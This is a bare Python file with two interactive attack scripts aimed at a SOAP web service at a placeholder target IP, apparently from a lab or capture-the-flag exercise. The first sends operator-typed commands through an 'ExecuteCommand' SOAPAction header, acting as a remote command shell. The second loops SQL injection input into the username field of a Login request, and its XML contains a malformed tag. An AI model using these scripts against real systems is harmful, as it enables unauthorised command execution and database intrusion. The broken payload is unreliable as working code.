import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:PORT/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)









#Advanced:

import requests

url = "http://<TARGET IP>:3002/wsdl"  # Replace with actual IP

while True:
    username_payload = input("SQLi> ")
    xml_payload = f'''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema">
      <soap:Body>
        <LoginRequest xmlns="http://tempuri.org/">
          <username">{username_payload}</username>
          <password>anything</password>
        </LoginRequest>
      </soap:Body>
    </soap:Envelope>'''

    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": "Login"
    }

    response = requests.post(url, data=xml_payload, headers=headers)
    print(response.text)
